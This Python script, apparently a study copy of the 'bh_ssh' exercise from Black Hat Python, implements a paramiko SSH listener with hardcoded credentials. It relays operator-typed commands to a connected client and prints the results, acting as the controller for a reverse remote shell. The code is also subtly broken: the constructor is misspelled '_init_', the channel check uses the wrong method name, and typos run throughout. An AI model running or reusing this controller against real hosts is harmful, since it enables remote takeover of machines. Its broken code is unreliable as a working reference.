import os
import paramiko
import socket
import sys
import threading

from paramiko.channel import Channel

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, '.test_rsa.key'))

class Server(paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()
    
    def check_channel_env_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, usernane, password):
        if (usernane == 'error-fiat') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL


if __name__ == '__main__':
    server = '192.168.131.1'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)

        print("[+] Listening for connection ...")
        clent, addr = sock.accept()

    except Exception as e:
        print('[-] Listen Faild: ' + str(e))
        sys.exit()

    else:
        print('[+] Got a connection!', clent, addr)

    bhSession = paramiko.Transport(clent)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print("*** No Chanel.")
        sys.exit()

    print('[+] Authenticated !')
    print(chan.recv(1024))

    chan.send('Welcom to bh_shh')

    try:
        while True:
            command = input('Enter the command => ')
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break

    except KeyboardInterrupt:
        bhSession.close()

